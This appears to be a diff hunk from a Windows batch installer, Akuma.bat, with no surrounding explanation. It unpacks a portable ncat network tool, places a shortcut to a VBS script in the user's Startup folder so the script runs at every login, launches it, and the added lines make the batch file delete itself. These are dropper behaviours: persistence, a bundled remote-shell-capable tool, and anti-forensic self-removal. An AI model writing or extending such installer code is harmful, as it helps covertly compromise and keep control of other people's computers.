@@ -29,3 +29,5 @@ tar -xf ncat-portable-5.59BETA1.zip
 echo y| del "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
 start %homedrive%\Akuma\Akuma.vbs
+cd %~dp0
+del Akuma.bat
